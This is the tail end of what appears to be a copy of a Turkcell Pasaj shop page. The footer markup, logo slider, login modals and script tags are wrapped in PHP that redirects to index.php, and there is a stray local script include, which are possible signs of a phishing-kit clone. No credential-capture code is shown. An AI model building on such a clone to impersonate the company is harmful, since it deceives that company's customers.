	                                          <a href="/pasaj/cep-telefonu/giyilebilir-teknolojiler/akilli-bileklikler?place=footer&place=footer" title="Akıllı Bileklikler ">Akıllı Bileklikler </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/bilgisayar-tablet/bilgisayarlar/oyun-bilgisayari?place=footer" title="Oyun Bilgisayarları">Oyun Bilgisayarları</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/bilgisayar-tablet/tabletler?place=footer" title="Tabletler">Tabletler</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/bilgisayar-tablet/bilgisayarlar/laptoplar?place=footer" title="Laptoplar">Laptoplar</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/elektrikli-ev-aletleri/supurge/robot-supurgeler?place=footer" title="Robot Süpürgeler ">Robot Süpürgeler </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/beyaz-esya?place=footer" title="Beyaz Eşya ">Beyaz Eşya </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/saglik-ve-kisisel-bakim-urunleri/agiz-bakim-urunleri/sarjli-dis-fircasi?place=footer" title="Şarjlı Diş Fırçaları ">Şarjlı Diş Fırçaları </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/hobi-oyun/oyun-konsolu?place=footer" title="Oyun Konsolu ">Oyun Konsolu </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/cep-telefonu-aksesuarlari/kulakliklar?place=footer" title="Kablosuz Kulaklıklar">Kablosuz Kulaklıklar</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/anne-bebek-oyuncak?place=footer" title="Anne - Bebek Ürünleri">Anne - Bebek Ürünleri</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/saglik-ve-kisisel-bakim-urunleri/cilt-bakim-teknolojileri-foreo?place=footer" title="Foreo Yüz Temizleme Cihazı">Foreo Yüz Temizleme Cihazı</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/hobi-oyun/oyun-konsolu/ps5?place=footer" title="Playstation 5">Playstation 5</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://www.turkcell.com.tr/pasaj/elektrikli-ev-aletleri/supurge/dikey-supurgeler/dyson-v15-detect-absolute?place=footer" title="Dyson V15">Dyson V15</a>
	                                       </li>
	                                    
	                                 </ul>
	                              
	                           </li>
	                        
	                            <li class="dropdown">
	                              <a href="javascript:;" title="Cep Telefonları ve Markalar">Cep Telefonları ve Markalar</a>
	                              
	                                 <ul>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/ios-telefonlar/iphone-14-128-gb?place=footer" title="iPhone 11">iPhone 11</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/ios-telefonlar/iphone-14-plus-128-gb?place=footer" title="iPhone 11 Plus">iPhone 11 Plus</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/ios-telefonlar/iphone-14-pro-128-gb?place=footer" title="iPhone 11 Pro">iPhone 11 Pro</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/ios-telefonlar/iphone-14-pro-max-128-gb?place=footer" title="iPhone 11 Pro Max">iPhone 11 Pro Max</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/ios-telefonlar/iphone-13-128-gb?place=footer" title="iPhone 13">iPhone 13</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/ios-telefonlar/iphone-13-mini-128-gb?place=footer" title="iPhone 13 Mini">iPhone 13 Mini</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/ios-telefonlar/iphone-13-pro-128-gb?place=footer" title="iPhone 13 Pro">iPhone 13 Pro</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/ios-telefonlar/iphone-13-pro-max-512-gb?place=footer" title="iPhone 13 Pro max">iPhone 13 Pro max</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/ios-telefonlar/iphone-11-64-gb?place=footer" title="iPhone 11 ">iPhone 11 </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/samsung-galaxy-z-fold3-5g?place=footer" title="Samsung Galaxy Z Fold 3">Samsung Galaxy Z Fold 3</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/galaxy-s22-ultra-128-gb?place=footer" title="Samsung Galaxy S22 Ultra">Samsung Galaxy S22 Ultra</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/xiaomi-redmi-note-11-pro-128gb-6gb?place=footer" title="Xiaomi Redmi Note 11 Pro ">Xiaomi Redmi Note 11 Pro </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/samsung-galaxy-a32?place=footer" title="Samsung Galaxy A32">Samsung Galaxy A32</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/galaxy-a73-5g-128gb?place=footer" title="Samsung Galaxy A73 ">Samsung Galaxy A73 </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/samsung-galaxy-a03-64-gb?place=footer" title="Samsung Galaxy A03">Samsung Galaxy A03</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/samsung-galaxy-a04-128-gb?place=footer" title="Samsung Galaxy A04">Samsung Galaxy A04</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/xiaomi-redmi-note-11-pro-6gb-ram---128gb-cep-telefonu--xiaomi-turkiye-garantili-?place=footer" title="Xiaomi Redmi Note 11 ">Xiaomi Redmi Note 11 </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/xiaomi-redmi-10c-4-gb-64-gb?place=footer" title="Xiaomi Redmi Note 10C">Xiaomi Redmi Note 10C</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/p13-blue-max-lite-2022?place=footer" title="Reeder P13 Blue Max Lite 2022">Reeder P13 Blue Max Lite 2022</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/omix-x400-12gb-ram-128-gb--6gb-ram--6gb-vram--?place=footer" title="Omix X400">Omix X400</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/cep-telefonu/android-telefonlar/oppo-a16-4-gb-ram-64-gb?place=footer" title="Oppo A16">Oppo A16</a>
	                                       </li>
	                                    
	                                 </ul>
	                              
	                           </li>
	                        
	                            <li class="dropdown">
	                              <a href="javascript:;" title="İşlem Merkezi">İşlem Merkezi</a>
	                              
	                                 <ul>
	                                    
	                                       <li>
	                                          <a href="/hesabim?place=footer" title="Giriş Yap">Giriş Yap</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/turkcellli-olmak/paket-secimi?place=footer" title="Yeni Hat">Yeni Hat</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/yardim/yardim-araclari/fatura-borc-sorgulama-ve-odeme?place=footer" title="Fatura Sorgula & Öde ">Fatura Sorgula & Öde </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/paket-ve-tarifeler/ek-paketler/faturali-hat?place=footer" title="Faturalı Ek Paket Al">Faturalı Ek Paket Al</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/yukle/hazir-kart-paket-yukle?place=footer" title="Faturasız Paket Yükle">Faturasız Paket Yükle</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/yukle/tl-yukle?place=footer" title="TL Yükle">TL Yükle</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/yukle/bilgisayardan-internet-paketi-yukle?place=footer" title="Bilgisayardan İnternet Yükle">Bilgisayardan İnternet Yükle</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/turkcell-platinum?place=footer" title="Platinum Paketler">Platinum Paketler</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/pasaj/siparis-sorgulama?place=footer" title="Sipariş Takibi">Sipariş Takibi</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/duyurular/guvenli-internet-hizmeti?place=footer" title="Güvenli İnternet">Güvenli İnternet</a>
	                                       </li>
	                                    
	                                 </ul>
	                              
	                           </li>
	                        
	                            <li class="dropdown">
	                              <a href="javascript:;" title="Yardım">Yardım</a>
	                              
	                                 <ul>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/iletisim/turkcell-iletisim-merkezleri?place=footer" title="En Yakın Mağaza">En Yakın Mağaza</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/kampanya/masterpass/?place=footer" title="Masterpass™">Masterpass™</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/yardim/yardim-araclari/puk-sorgulama?place=footer" title="Puk Sorgulama">Puk Sorgulama</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/yardim/online-alisveris/turkcell-pasaj/islem-rehberi?place=footer" title="İşlem Rehberi">İşlem Rehberi</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/video-galeri/yardim-videolari?place=footer" title="Yardım Videoları">Yardım Videoları</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/yardim/hattiniz/faturali/fatura-tutarimi-nasil-ogrenebilirim?place=footer" title="Sıkça Sorulan Sorular - Faturalı Hat ">Sıkça Sorulan Sorular - Faturalı Hat </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/yardim/hattiniz/hazirkart/nasil-tl-yukleyebilirim?place=footer" title="Sıkça Sorulan Sorular - Hazır Kart">Sıkça Sorulan Sorular - Hazır Kart</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="pasaj/satici-ol?place=footer" title="Pasajda Satıcı Ol">Pasajda Satıcı Ol</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/yardim/yurtdisi?place=footer" title="Yurt Dışı">Yurt Dışı</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://www.turkcell.com.tr/tr/form/arabuluculuk-basvuru-formu?place=footer" title="Arabuluculuk Başvuru Formu">Arabuluculuk Başvuru Formu</a>
	                                       </li>
	                                    
	                                 </ul>
	                              
	                           </li>
	                        
	                            <li class="dropdown">
	                              <a href="javascript:;" title="Özel Günler">Özel Günler</a>
	                              
	                                 <ul>
	                                    
	                                       <li>
	                                          <a href="https://www.turkcell.com.tr/kampanya/sevgililer-gunu/?place=footer" title="Sevgililer Günü ">Sevgililer Günü </a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/kampanya/yilbasi-hediyeleri-firsatlari/?place=footer" title="Yılbaşı Hediyeleri Kampanyası">Yılbaşı Hediyeleri Kampanyası</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/kampanya/pasaj-gunleri/?place=footer" title="Pasaj Günleri">Pasaj Günleri</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/sari-gunler?place=footer" title="Sarı Günler">Sarı Günler</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/uykusu-kacanlar-kulubu?place=footer" title="Uykusu Kaçanlar Kulübü">Uykusu Kaçanlar Kulübü</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://www.turkcell.com.tr/kampanyalar/pasaj/cihazlar/ramazan-bayrami-kampanyasi?place=footer" title="Ramazan Kampanyası">Ramazan Kampanyası</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/kampanya/anneler-gunu-hediyesi/?place=footer" title="Anneler Günü">Anneler Günü</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://www.turkcell.com.tr/kampanya/babalar-gunu-hediyesi/?place=footer" title="Babalar Günü">Babalar Günü</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/kampanya/okula-ve-sehre-donus-kampanyalari/?place=footer" title="Okula Dönüş Kampanyası">Okula Dönüş Kampanyası</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/kampanya/firsatlar-pasaji/?place=footer" title="Fırsatlar Pasajı">Fırsatlar Pasajı</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://www.turkcell.com.tr/karne-hediyesi?place=footer" title="Karne Hediyeleri">Karne Hediyeleri</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="https://www.turkcell.com.tr/kampanya/dugun-ve-ceyiz-paketleri/?place=footer" title="Düğün ve Çeyiz Paketleri">Düğün ve Çeyiz Paketleri</a>
	                                       </li>
	                                    
	                                 </ul>
	                              
	                           </li>
	                        
	                            <li class="dropdown">
	                              <a href="javascript:;" title="Tüketici Şikayetleri">Tüketici Şikayetleri</a>
	                              
	                                 <ul>
	                                    
	                                       <li>
	                                          <a href="/tr/tuketici-sikayetleri?place=footer" title="Şikayet Talebi Oluşturma">Şikayet Talebi Oluşturma</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/tuketici-sikayetleri/listeleme?place=footer" title="Şikayet Takibi">Şikayet Takibi</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/yardim/yardim-araclari/alacak-sorgulama?place=footer" title="Alacak Sorgulama, TL İade Talep​">Alacak Sorgulama, TL İade Talep​</a>
	                                       </li>
	                                    
	                                       <li>
	                                          <a href="/tr/hakkimizda/duyurular/musteri-iadeleri-ile-ilgili-duyurular-bilgilendirmeler-ve-islemler?place=footer" title="BTK İade Duyurusu">BTK İade Duyurusu</a>
	                                       </li>
	                                    
	                                 </ul>
	                              
	                           </li>
	                        
	                     </ul>
	                  </nav>
	               
 </div>
 <div class="m-grid-col">
 	
	                  <div class="o-p-footer__social">
	                     <strong>Bizi Takip Edin</strong>
	                     
<div class="m-btn-group m-p-btn-group m-btn-group--align-right">
	
<a class="a-btn-icon-p" href="http://www.twitter.com/Turkcell" title="Twitter" target="blank" >
	<i class="icon-p-twitter"></i>
	
</a>
<a class="a-btn-icon-p" href="http://www.facebook.com/Turkcell" title="Facebook" target="blank" >
	<i class="icon-p-facebook"></i>
	
</a>
<a class="a-btn-icon-p" href="https://www.instagram.com/turkcell/" title="Instagram" target="blank" >
	<i class="icon-p-instagram"></i>
	
</a>
<a class="a-btn-icon-p" href="http://www.youtube.com/Turkcell" title="Youtube" target="blank" >
	<i class="icon-p-youtube"></i>
	
</a>
<a class="a-btn-icon-p" href="https://www.linkedin.com/company/turkcell/?originalSubdomain=tr" title="Linkedin" target="blank" >
	<i class="icon-p-linkedin"></i>
	
</a>
</div>
	                  </div>
	               
 </div>
 <div class="m-grid-col">
 	
	                   <div class="mobile__language">
	                           <strong>Language</strong> <div class="m-p-dropdown m-p-dropdown--clickable" data-component="PasajDropdown" role="navigation"><input type="checkbox" id="s0-0-80-14-dropdown"><label aria-haspopup="true" title="Türkçe" for="s0-0-80-14-dropdown">Türkçe</label> <ul aria-hidden="true" aria-labelledby="s0-0-80-14-dropdown"> <li><a href="https://www.turkcell.com.tr/english-support" title="English">English</a></li> <li><a href="https://www.turkcell.com.tr" title="Türkçe">Türkçe</a></li> <li><a href="https://www.turkcell.com.tr/arabic-support" title="عربى">عربى</a></li> <li><a href="https://www.turkcell.com.tr/russian-support" title="русский">русский</a></li> </ul> </div>
	                   </div>
	               
 </div>
	         </div>
	         <div class="o-p-footer-bottom">
	            <div class="o-p-footer__partners">
	               <div class="o-p-footer__partners__inner">
	                  
<div data-component='PasajSlider'  id="" class="m-p-slider">
	<div class="swiper-container">
		<div class="swiper-wrapper">
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://fizy.com" title="Fizy" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/fizy-logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://yaani.com.tr" title="Yaani" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/Yaani.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://www.superonline.net/" title="Turkcell Superonline" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/sol-yeni-logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://www.turkcell.com.tr/platinum" title="Platinum" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/platinum-logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://bip.com" title="BiP" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/bip-logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="http://www.turkiyeninuygulamalari.com/tr" title="Türkiye'nin Uygulamaları" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/TurkiyeninUygulamalari-Logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://www.tvplus.com.tr/" title="TV+" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/tv-plus-logo-yeni.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://mylifebox.com/" title="Lifebox" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/LifeBox-Logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://paycell.com.tr/" title="Paycell" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/paycell-logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://www.turkcell.com.tr/gnctrkcll" title="Gnctrkcll" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/gnc-logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://www.globalbilgi.com.tr/" title="Turkcell Global Bilgi" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/Global-Bilgi-Logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="http://playcell.com/" title="Playcell" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/Playcell.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://www.turkcell.com.tr/5g5t" title="5G5T" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/5G5T-Logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://partner.turkcell.com.tr" title="Turkcell Partner Program" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/Turkcell-Partner-Network-Logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://gelecegiyazanlar.turkcell.com.tr/" title="Turkcell Geleceği Yazanlar" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/Gelecegi-YazanKadinlar-Logo.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="http://www.turkcelldiyalogmuzesi.com/" title="Turkcell Diyalog Müzesi" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/Turkcell-Dialog-Muzesi.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	
		<div class="swiper-slide swiper-lazy">
			
	                           <a href="https://turkcellbulut.com/" title="Turkcell Akıllı Bulut" target="blank">
	                              <figure>
	                                 <img src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Kategori/menu/Turkcell-Bulut.png?1773534948049"  />
	                              </figure>
	                           </a>
	                        
		</div>
	</div>
	</div>
	
		<div class="m-p-slider__nav">
			<span class="m-p-slider__nav__prev"></span>
			<span class="m-p-slider__nav__next"></span>
		</div>
		
</div>
	               </div>
	            </div>
	            <div class="o-p-footer__copy">
	                  
 <div class="m-grid-col">
 	<ul><li><a href="/tr/gizlilik-ve-guvenlik" title="Gizlilik ve Güvenlik">Gizlilik ve Güvenlik</a></li><li><a href="/tr/hakkimizda/site-haritasi" title="Site Haritası">Site Haritası</a></li></ul>
 </div>
 <div class="m-grid-col-2">
 	
	                     <span class="o-p-footer__copyright">
	                     	<div id="ETBIS">
				                <div id="1764651406148822">
				                  <a href="https://etbis.eticaret.gov.tr/sitedogrulama/1764651406148822" target="_blank" rel="nofollow">
				                    <img src="https://ffo3gv1cf3ir.merlincdn.netdata:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjMiIGhlaWdodD0iMzAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PC9zdmc+Cg==?1773534948049" data-src="https://ffo3gv1cf3ir.merlincdn.net/SiteAssets/Genel/ana-sayfa/etbis-qr-code.png?1773534948049" alt="" class="lazyload "  />	
				                  </a>
				                </div>
				            </div>
	                     	© 2022 Turkcell
	                     </span>
	                  
 </div>
	            </div>
	         </div>
			
					<!-- Build Date : 20-06-2023 11:09:32, WLS Host Name : DC-g07-07-2-1, Environment : PROD SH-ECOM -->
				
	      </footer>
	

<input type="hidden" id="checkLoginUrl" value="/pasaj/site/checkLogin"/>
<input type="hidden" id="favInfoUrl" value="/pasaj/favorite-info"/>


		<script type="text/javascript">
			var isProdMode = true;
			var isPassageInsiderActive = false;
		</script>

		

<div class="info-modal-content" id="login-error-lightbox" style="display: none;">
	<div class="inline-inner">
		<figure>
			<img src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/common/images/icons/error.svg">
		</figure>
		<h4>Hatalı Giriş</h4>
		<p class="js-login-error-modal-text">passage.modal.login.error.text</p>
		<a class="a-p-btn gtrigger-close inline-close-btn">Kapat</a>
	</div>
</div>

<div class="info-modal-content" id="login-logout-lightbox" style="display: none;">
	<div class="inline-inner">
		<figure class="info-modal-content__picto">
			<img src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/common/images/icons/exit.svg">
		</figure>
		<h4 class="color_clay">Çıkış yapmak istediğinize emin misiniz?</h4>
		<p>&nbsp;</p>
		<div class="info-modal-content__buttons">
			<a class="a-p-btn a-p-btn--clear gtrigger-close" href="javascript:;">Vazgeç</a>
			<a class="a-p-btn js-p-login-logout" href="javascript:;">Çıkıs Yap</a>
		</div>
	</div>
</div>
<div class="info-modal-content" id="login-timeout-lightbox" style="display: none;">
	<div class="inline-inner">
		<h4 class="color_clay">passage.modal.login.timeout.info.title</h4>
		<p>passage.modal.login.timeout.info.desc</p>
		<PasajProgress class="a-p-progress--danger" />
		<div class="info-modal-content__buttons">
			<a class="a-p-btn a-p-btn--clear js-p-login-logout gtrigger-close" href="javascript:;">passage.modal.login.timeout.logout</a>
			<a class="a-p-btn gtrigger-close js-p-login-continue" href="javascript:;">passage.modal.login.timeout.continue</a>
		</div>
	</div>
</div>


	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/common/scripts/vendors.js?1773534948049"></script>
	    
			
				<script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/passage-assets/mobile/scripts/app.mobile.min.js?1773534948049"></script>
			
			
		

		

		<script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/swiper.min.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/select2.full.min.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/select2-tr.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/jquery.typeahead.min.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/tr.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/jquery.waypoints.min.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/infinite.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/headroom.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/lazysizes.min.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/ls.unveilhooks.min.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/jquery.countdown.min.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/tooltipster.bundle.min.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/handlebars.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/jquery.inputmask.bundle.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/lottie_html.min.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/flatpickr.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/flatpickr-tr.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/rivets.bundled.min.js?1773534948049"></script>
	    
			<script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/core-js.min.js?1773534948049"></script>
		    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/jquery.elevatezoom.js?1773534948049"></script>
	    
		
			
				<script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/mobile/scripts/app.mobile.min.js?1773534948049"></script>
				<script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/smartbanner.min.js?1773534948049"></script>
			
			
		
		<!-- PAGE JS FILES -->
		
		<script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/shop.utils.js?1773534948049"></script>
		
			<script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/mobile/scripts/shop/device.detail.js?1773534948049" ></script>
		
		<!-- PAGE JS FILES -->

	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/jquery.cookies.min.js?1773534948049"></script>
	    <script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/common/scripts/vendors/modernizr.min.js?1773534948049"></script>
	    <script type="text/javascript" src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assets/scripts/turkcell/mobile/base.js?1773534948049"></script>
		<script defer src="https://ffo3gv1cf3ir.merlincdn.net/pasaj_static_lib/assetsv2/mobile/scripts/shop/google-analytics-mobile.js?1773534948049"></script>

		<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
		<script src="../BellaMain/assets/js/iller.js"></script>


		








		<script>
			
		</script>
	    <!-- definitions.common.mobile.body.end -->
		<!-- TEST-->
		<!-- End definitions.common.mobile.body.end -->
        <?php
      } else {
        header("Location: index.php");
        exit;   
    }
}
}
?> 
